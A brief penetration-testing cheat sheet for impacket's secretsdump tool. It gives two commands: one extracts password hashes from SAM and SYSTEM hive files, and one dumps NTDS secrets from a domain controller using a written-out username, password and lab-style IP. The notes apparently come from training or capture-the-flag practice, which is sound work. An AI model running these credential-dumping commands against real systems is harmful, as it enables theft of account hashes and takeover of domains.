# secretsdump
# secretsdump can be found within impacket/exmaples

# Get passwords hashes from SAM and SYSTEM files
./secretsdump.py -sam /root/Desktop/SAM -system /root/Desktop/SYSTEM LOCAL


# Get secrets (NTDS) from a domain controller
;; This is particularly useful whenever we have a privileged account
python secretsdump.py spookysec.local/backup:backup2517860@10.10.213.232
